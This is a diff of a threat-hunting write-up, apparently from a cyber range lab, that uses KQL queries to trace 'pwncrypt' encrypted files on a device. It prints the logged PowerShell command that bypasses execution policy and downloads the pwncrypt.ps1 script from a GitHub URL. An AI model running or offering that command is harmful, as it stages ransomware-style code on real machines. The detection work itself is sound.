@@ -45,26 +45,30 @@ DeviceFileEvents
 ### 2. Searched the `DeviceFileEvents` Table
 
 I ran a query that revealed several files created with the “pwncrypt” extension.
-Files: `1308_EmployeeRecords_pwncrypt.csv`
-`6664_ProjectList_pwncrypt.csv`
-`2669_CompanyFinancials_pwncrypt.csv`
-
+Files: `1308_EmployeeRecords_pwncrypt.csv``6664_ProjectList_pwncrypt.csv``2669_CompanyFinancials_pwncrypt.csv`. Additionally, the `InitiatingProcessCommandLine` table revealed the script that was run `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1` The command opens PowerShell, tells it to ignore all safety settings(`ExecutionPolicy Bypass `), then downloads a suspicious script called pwncrypt.ps1 from the internet(`Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1`) and saves it in a system folder(`C:\ProgramData\pwncrypt.ps1`)
 **Query used to locate events:**
 ```kql
- DeviceFileEvents
+DeviceFileEvents
 | where DeviceName == "edr-machine"
 | where FileName has_any ("pwncrypt")
 | sort by Timestamp desc
-| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessParentFileName
+| project Timestamp, ActionType, FileName, FolderPath, InitiatingProcessAccountName, InitiatingProcessParentFileName, InitiatingProcessCommandLine
 | where ActionType  == "FileCreated"
 | where Timestamp >= datetime(2025-04-17T20:14:28.4324263Z)
 ```
 ![image](https://github.com/user-attachments/assets/2542925f-a21c-4154-806a-1e40613a3390)
 
 
+
+
+
+
+
+
+
 ### 3. Searched the `DeviceProcessEvents` Table
 
-I next checked the DeviceProcessEvents table in order to determine how the files were encrypted. I found evidence of manual `cmd.exe` of powershell running -ExecutionPollicy Bypass to avoid execution restrictions.
+I next checked the DeviceProcessEvents table in order to determine how the files were encrypted. I found evidence of manual `cmd.exe` of powershell running 
 
 **Query used to locate event:**
 
